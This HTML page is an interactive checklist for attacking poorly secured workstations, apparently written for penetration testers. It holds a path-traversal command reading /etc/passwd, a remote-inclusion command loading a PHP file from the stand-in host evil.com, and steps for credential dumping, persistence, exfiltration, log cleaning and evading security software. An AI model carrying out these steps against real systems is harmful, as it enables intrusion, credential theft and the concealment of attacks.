<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Low-Point Workstation Checklist</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <header>
        <h1>Low-Point Workstation Exploitation Checklist</h1>
        <nav>
            <a href="index.html">Back to Home</a>
        </nav>
    </header>
    <main>
        <article>
            <h2>Steps for Exploiting Low-Security Workstations</h2>
            <ul>
                <li><input type="checkbox" id="nmap-scan"> <label for="nmap-scan">Perform a thorough network scan using Nmap to identify open ports and services. Command: <code>nmap -sV -p- x.x.x.x</code></label></li>
                <li><input type="checkbox" id="vuln-scan"> <label for="vuln-scan">Run vulnerability scans using tools like Nessus or OpenVAS to detect exploitable vulnerabilities.</label></li>
                <li><input type="checkbox" id="exploit"> <label for="exploit">Exploit identified vulnerabilities using Metasploit or custom scripts.</label></li>
                <li><input type="checkbox" id="session-hijack"> <label for="session-hijack">Attempt session hijacking if applicable to gain further access.</label></li>
                <li><input type="checkbox" id="lfi"> <label for="lfi">Test for Local File Inclusion (LFI) vulnerabilities. Command: <code>curl http://x.x.x.x/page=../../../../etc/passwd</code></label></li>
                <li><input type="checkbox" id="rfi"> <label for="rfi">Check for Remote File Inclusion (RFI) by including external files. Command: <code>curl http://x.x.x.x/page=http://evil.com/malicious.php</code></label></li>
                <li><input type="checkbox" id="mimikatz"> <label for="mimikatz">Run Mimikatz to dump credentials from memory.</label></li>
                <li><input type="checkbox" id="persistence-setup"> <label for="persistence-setup">Establish persistence mechanisms such as scheduled tasks or registry keys.</label></li>
                <li><input type="checkbox" id="data-exfiltration"> <label for="data-exfiltration">Exfiltrate critical data using secure copy or Netcat.</label></li>
                <li><input type="checkbox" id="cover-tracks"> <label for="cover-tracks">Cover tracks by cleaning logs and hiding the forensic evidence.</label></li>
                <li><input type="checkbox" id="analyze-traffic"> <label for="analyze-traffic">Analyze network traffic to find additional targets or data leakage points.</label></li>
                <li><input type="checkbox" id="security-software"> <label for="security-software">Identify and disable or evade active security software.</label></li>
                <li><input type="checkbox" id="remote-control"> <label for="remote-control">Set up remote control functionalities for easy access.</label></li>
                <li><input type="checkbox" id="report-preparation"> <label for="report-preparation">Prepare detailed reports of the exploitation process.</label></li>
                <li><input type="checkbox" id="operational-security"> <label for="operational-security">Review and ensure operational security throughout the engagement.</label></li>
                <li><input type="checkbox" id="forensic-readiness"> <label for="forensic-readiness">Prepare for potential forensic investigation by securing logs and artifacts.</label></li>
                <li><input type="checkbox" id="legal-compliance"> <label for="legal-compliance">Check for compliance with legal requirements post-exploitation.</label></li>
                <li><input type="checkbox" id="community-engagement"> <label for="community-engagement">Engage with the cybersecurity community to share findings and get feedback.</label></li>
                <li><input type="checkbox" id="skills-development"> <label for="skills-development">Develop further skills based on the exploitation experience.</label></li>
                <li><input type="checkbox" id="tool-updates"> <label for="tool-updates">Update and maintain exploitation tools for future readiness.</label></li>
            </ul>
        </article>
    </main>

</body>
</html>
